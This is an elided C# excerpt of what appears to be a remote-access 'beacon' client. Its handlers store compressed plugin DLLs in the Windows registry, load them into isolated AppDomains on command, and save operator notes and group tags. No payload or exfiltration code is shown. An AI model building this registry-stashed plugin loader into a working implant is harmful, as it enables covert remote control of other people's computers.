	...
	internal static class BeaconHandle
	{
		...
		private static void HandleRunPlugin(Action<byte[]> send, BeaconMsgPack mp, string CID)
		{
			try
			{
				...
				if (SetRegistry.GetValue(dllHash) == null)
				{
		...
		private static void HandleSavePlugin(Action<byte[]> send, BeaconMsgPack mp, string CID)
		{
			try
			{
				...
				SetRegistry.SetValue(hash, dllBytes);
		...
		private static void HandleUpdateNotes(Action<byte[]> send, BeaconMsgPack mp, string CID)
		{
			try
			{
				...
				bool success = SetRegistry.SetStringValue("Notes", notes);
		...
		private static void HandleUpdateGroup(Action<byte[]> send, BeaconMsgPack mp, string CID)
		{
			try
			{
				...
				bool success = SetRegistry.SetStringValue("Group", group);
		...
		public class PluginDomainController : MarshalByRefObject
		{
		...
		public class SendCallback : MarshalByRefObject
		{
		...
		public class DestroyCallback : MarshalByRefObject
		{
		...
		public static void Invoke(Action<byte[]> send, BeaconMsgPack unpack_msgpack)
		{
			try
			{
				...
				byte[] dllBytes = SetRegistry.GetValue(dllHash);
				byte[] decompressedDll = Zip.Decompress(dllBytes);
				AppDomainSetup setup = new AppDomainSetup { ApplicationBase = AppDomain.CurrentDomain.BaseDirectory };
				var domain = AppDomain.CreateDomain($"plugin_{cid}_{dllHash}", null, setup);
				var controller = (PluginDomainController)domain.CreateInstanceAndUnwrap(
					Assembly.GetExecutingAssembly().FullName,
					typeof(PluginDomainController).FullName);
				...
				Action destroyInstanceDelegate = () =>
				{
					try
					{
						if (_pluginInstances.TryGetValue(instanceKey, out var record))
						{
							...
							try { AppDomain.Unload(record.Domain); } catch { }
						}
					}
					finally
					{
				...
				else
				{
					...
					_pluginInstances[instanceKey] = new PluginInstanceRecord { Domain = domain, Controller = controller };
				}
				lock (_pluginLocks[instanceKey])
				{
					...
					catch (System.Runtime.Remoting.RemotingException)
					{
						try
						{
							...
							{
								_pluginInstances.Remove(instanceKey);
								try { AppDomain.Unload(bad.Domain); } catch { }
							}
							AppDomainSetup setup2 = new AppDomainSetup { ApplicationBase = AppDomain.CurrentDomain.BaseDirectory };
							var domain2 = AppDomain.CreateDomain($"plugin_{cid}_{dllHash}", null, setup2);
							var controller2 = (PluginDomainController)domain2.CreateInstanceAndUnwrap(
								Assembly.GetExecutingAssembly().FullName,
								typeof(PluginDomainController).FullName);
							...
							_pluginInstances[instanceKey] = new PluginInstanceRecord { Domain = domain2, Controller = controller2 };
